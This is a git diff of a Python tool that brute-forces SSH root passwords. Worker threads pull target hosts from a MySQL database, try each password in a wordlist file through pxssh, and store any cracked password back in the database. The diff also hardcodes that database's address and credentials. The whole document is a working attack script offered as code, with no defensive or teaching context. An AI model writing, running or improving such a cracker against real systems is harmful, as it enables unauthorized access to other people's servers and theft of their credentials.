@@ -5,56 +5,71 @@
 '''
 from pexpect import pxssh
 from threading import *
+from databaseHelper import DatabaseHelper
 
-mutex = Lock()
+PASSWORDFILE = 'password.txt'
 
 class CrackSSHWorkInfo:
-  def __init__(self, host, password, user='root'):
+  def __init__(self, id, host, user='root'):
     self._user = user
     self._host = host
-    self._password = password
+    self._id = id
+    self.dbHelper = DatabaseHelper('192.168.1.102', 'crack_ssh', 'root', '123456')
     
-  def checkPassword(self):
+  def _checkPassword(self, password):
     try:
       s = pxssh.pxssh()
-      s.login(self._host, self._user, self._password)
+      s.login(self._host, self._user, password)
     except Exception as e:
       print('[-] Login Fail..., ErrorInfo: {0}'.format(e))
       return False
     finally:
       s.logout()
     return True
-  
-  def getHost(self):
-    return self._host
 
-  def getPassword(self):
-    return self._password
-        
+  def _saveWorkInfo(self, password):
+    self.dbHelper.nonQuery('update crackResult set password = %s, crackState = %s where id = %s', (password, ENDCRACK, self._id))
 
+  def workThread(self, lock):
+    self.dbHelper.nonQuery('update crackResult set crackState = %s where id = %s', (CRACKING, self._id))
+    with open(PASSWORDFILE, 'r') as f:
+      for line in f:
+        line = line.strip('\n').strip()
+        if self._checkPassword(line):
+          self._saveWorkInfo(line)
+          break
+      else:
+        self.dbHelper.nonQuery('update crackResult set crackState = %s where id = %s', (ENDCRACK, self._id))
+    
 class CrackSSHThreadPool:
   def __init__(self, count):
-    self._count = count
-    pass
-
-  def _getWorkInfo(self):
-    return CrackSSHWorkInfo('192.168.240.122', 'toor')
+    self.threadLock = BoundedSemaphore(value=count)
+    self._schedule = SSHScheduler()
 
   def startThreadPool(self):
-    for i in range(self._count):
-      t = Thread(target=self._workThread)
+    while True:
+      self.threadLock.acquire()
+      workInfo = self._schedule.getNextWork()
+      if workInfo == None:
+        self.threadLock.release()
+        continue
+      t = Thread(target= workInfo.workThread, args=(self.threadLock,))
       t.start()
 
-  def _saveSuccessInfo(self, workInfo):
-    mutex.acquire()
-    print('[+] save Success, host: {0}, password: {1}'.format(workInfo.getHost(), workInfo.getPassword()))
-    mutex.release()
+class SSHScheduler:
+  def __init__(self):
+    self.dbHelper = DatabaseHelper('192.168.1.102', 'crack_ssh', 'root', '123456')
+  
+  def getNextWork(self):
+    dictResult = self.dbHelper.queryOne('select id, host from crackResult where state = %s and password is null and crackState = %s', ('open', NOSTART))
+    if dictResult == None:
+      return None
+    return CrackSSHWorkInfo(dictResult['id'], dictResult['host'])
 
-  def _workThread(self):
-    while True:
-      workInfo = self._getWorkInfo()
-      if workInfo.checkPassword():
-          self._saveSuccessInfo(workInfo)
+    
+NOSTART = 0
+CRACKING = 1
+ENDCRACK = 2
 
 if __name__ == '__main__':
   csPool = CrackSSHThreadPool(10)
